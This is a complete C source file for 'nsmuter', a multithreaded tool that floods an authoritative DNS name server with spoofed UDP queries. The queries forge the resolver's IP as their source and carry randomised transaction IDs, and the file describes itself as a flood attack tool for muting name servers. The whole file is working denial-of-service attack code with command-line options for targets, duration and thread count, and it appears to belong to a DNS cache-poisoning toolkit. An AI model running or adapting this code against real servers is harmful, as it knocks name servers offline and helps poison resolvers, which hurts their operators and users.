/*
    Flood attack tool used to mute NS server.
*/

#include "util.h"
#include "network.h"
#include "dns.h"
#include "common.h"

uint64_t        g_pps_counter       = 0;
pthread_mutex_t g_pps_counter_mutex;
int             g_nsmuter_init      = FALSE;

struct mute_ns_server_arg {
    char* src_ip;
    char* dst_ip;
    char* domain_name;
    int* stop_flag;
};

/* Init. */
static void nsmuter_init() {
    if (!g_nsmuter_init) {
        g_nsmuter_init = TRUE;
        dns_init();
        pthread_mutex_init(&g_pps_counter_mutex, NULL);
    }
}

/* Get the value of pps_counter. */
static uint64_t get_pps_counter() {
    pthread_mutex_lock(&g_pps_counter_mutex);
    uint64_t ret = g_pps_counter;
    pthread_mutex_unlock(&g_pps_counter_mutex);
    return ret;
}

/* Incrase pps_counter. */
static void inc_pps_counter() {
    pthread_mutex_lock(&g_pps_counter_mutex);
    g_pps_counter++;
    pthread_mutex_unlock(&g_pps_counter_mutex);
}

/* Reset the value of pps_counter. */
static void reset_pps_counter() {
    pthread_mutex_lock(&g_pps_counter_mutex);
    g_pps_counter = 0;
    pthread_mutex_unlock(&g_pps_counter_mutex);
}

/* Print PPS. */
static void* show_pps_thread(void* arg) {
    struct mute_ns_server_arg* arg_s = (struct mute_ns_server_arg*)arg;
    int* stop_flag = arg_s->stop_flag;

    while (TRUE) {
        if (*stop_flag)
            break;

        sleep(1);
        printf("[ * ] Current PPS: %ld.\n", get_pps_counter());
        reset_pps_counter();
    }
}

/* Send flood. */
static void* mute_ns_server_thread(void* arg) {
    struct mute_ns_server_arg* arg_s = (struct mute_ns_server_arg*)arg;
    char* src_ip = arg_s->src_ip;
    char* dst_ip = arg_s->dst_ip;
    char* domain_name = arg_s->domain_name;
    int* stop_flag = arg_s->stop_flag;

    int sockfd = make_sockfd_for_spoof();
    
    struct dns_query* query[1];
    query[0] = new_dns_query_a(domain_name);

    // Make DNS packet.
    uint8_t* packet = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_len = make_dns_packet(packet, DNS_PKT_MAX_LEN, FALSE, 0, query, 1, NULL, 0, NULL, 0, FALSE);

    // Make UDP packet.
    uint8_t* packet_raw = (uint8_t*)alloc_memory(DNS_PKT_MAX_LEN);
    size_t packet_raw_len = make_udp_packet(packet_raw, DNS_PKT_MAX_LEN, inet_addr(src_ip), inet_addr(dst_ip),
                                            53, 0, packet, packet_len);
    
    // Send RAW packet.
    uint16_t src_port;
    for (src_port = 0; TRUE; src_port++) {
        // Check stop flag.
        if (*stop_flag)
            break;

        // Set TXID.
        ((struct dnshdr*)(packet_raw + sizeof(struct iphdr) + sizeof(struct udphdr)))->id = get_tx_id();

        send_udp_packet(sockfd, packet_raw, packet_raw_len, inet_addr(src_ip), inet_addr(dst_ip),
                        src_port, 53);
        inc_pps_counter();
    }

    free(packet_raw);
    free(packet);
    free_dns_query(query[0]);
    close(sockfd);
}

/* Mute NS Server. */
static void mute_ns_server(char* src_ip, char* dst_ip, char* domain_name, unsigned int sec, unsigned int thread_count) {
    pthread_t* thread_list = (pthread_t*)alloc_memory(sizeof(pthread_t) * thread_count);
    unsigned int i;
    struct mute_ns_server_arg arg;
    int stop_flag = FALSE;

    arg.src_ip = src_ip;
    arg.dst_ip = dst_ip;
    arg.domain_name = domain_name;
    arg.stop_flag = &stop_flag;
    
    // Create worker threads.
    for (i = 0; i < thread_count; i++)
        pthread_create(&thread_list[i], NULL, mute_ns_server_thread, &arg);

    // Create thread print PPS.
    pthread_create(&thread_list[thread_count], NULL, show_pps_thread, &arg);

    // Wait for stop.
    sleep(sec);
    stop_flag = TRUE;
    for (i = 0; i< thread_count + 1; i++)
        pthread_join(thread_list[i], NULL);

    free(thread_list);
}

int main(int argc, char** argv) {
    int ch;
    char* resolver_ip = NULL;
    char* ns_server_ip = NULL;
    char* domain_queried = NULL;
    char* seconds = "60";
    char* threads = "1";

    while ((ch = getopt(argc, argv, "r:u:d:s:t:")) != -1) {
        switch (ch) {
        case 'r':
            resolver_ip = optarg;
            break;
        case 'u':
            ns_server_ip = optarg;
            break;
        case 'd':
            domain_queried = optarg;
            break;
        case 's':
            seconds = optarg;
            break;
        case 't':
            threads = optarg;
            break;
        default:
            printf("Unknown arg\n");
            return 1;
        }
    }

    if (resolver_ip == NULL || ns_server_ip == NULL || domain_queried == NULL) {
        printf("Usage:\n");
        printf("./nsmuter -r <resolver_ip> -u <ns_server_ip> -d <domain_queried> [-s seconds] [-t threads]\n");
        return 1;
    }

    printf("[ * ] Start.\n");
    nsmuter_init();
    mute_ns_server(resolver_ip, ns_server_ip, domain_queried, atoi(seconds), atoi(threads));
    printf("[ * ] Finished.\n");

    return 0;
}
